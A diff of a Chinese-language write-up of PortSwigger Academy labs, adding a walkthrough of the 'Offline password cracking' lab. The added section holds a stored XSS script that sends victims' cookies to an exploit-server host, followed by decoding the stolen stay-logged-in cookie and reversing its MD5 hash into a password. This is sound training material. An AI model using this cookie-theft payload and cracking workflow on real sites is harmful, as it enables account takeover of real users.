@@ -676,8 +676,6 @@ async function main() {
 | Document  | https://portswigger.net/web-security/authentication/other-mechanisms#keeping-users-logged-in                   |
 | Lab       | https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie |
 
-是說，我是沒有想過 stay-logged-in cookie 的實作，所以這題的概念應該會蠻有趣的
-
 登入後，可以看到 `Set-Cookie: stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw; Expires=Wed, 01 Jan 3000 01:00:00 UTC`
 
 ```js
@@ -862,6 +860,55 @@ async function main() {
   }
 }
 ```
+
+## Lab: Offline password cracking
+
+| Dimension | Description                                                                                        |
+| --------- | -------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/authentication/other-mechanisms#keeping-users-logged-in       |
+| Lab       | https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking |
+
+留言功能有 XSS，可以竊取受害者的 cookie，嘗試留言
+
+```html
+<script>
+  fetch(
+    `https://exploit-0add00e9044ebd4f8145d3550182001f.exploit-server.net/exploit?cookie=${encodeURIComponent(document.cookie)}`,
+  );
+</script>
+```
+
+之後在 exploit-server 查看到
+
+```
+/exploit?cookie=secret%3D1REpZLmoJqZHg7MI35KYdxNTUijeqvfv%3B%20stay-logged-in%3DY2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
+```
+
+url decode 之後
+
+```js
+decodeURIComponent(
+  `secret%3D1REpZLmoJqZHg7MI35KYdxNTUijeqvfv%3B%20stay-logged-in%3DY2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz`,
+);
+// secret=1REpZLmoJqZHg7MI35KYdxNTUijeqvfv; stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
+```
+
+base64 decode 之後
+
+```js
+atob(`Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz`);
+// carlos:26323c16d5f4dabff3bb136f2460a943
+```
+
+[MD5 reverse](https://md5.gromweb.com/?md5=26323c16d5f4dabff3bb136f2460a943) 之後
+
+```
+carlos:onceuponatime
+```
+
+成功登入 && 刪除帳號～
+
+常見的 MD5 hashed 弱密碼可以透過 [線上的 MD5 Reverse 工具](https://md5.gromweb.com/) 來得知，我也是最近才得知的，因為 MySQL 跟 FileZilla Server 都會存 MD5 Hashed 密碼
 
 ## 參考資料
 
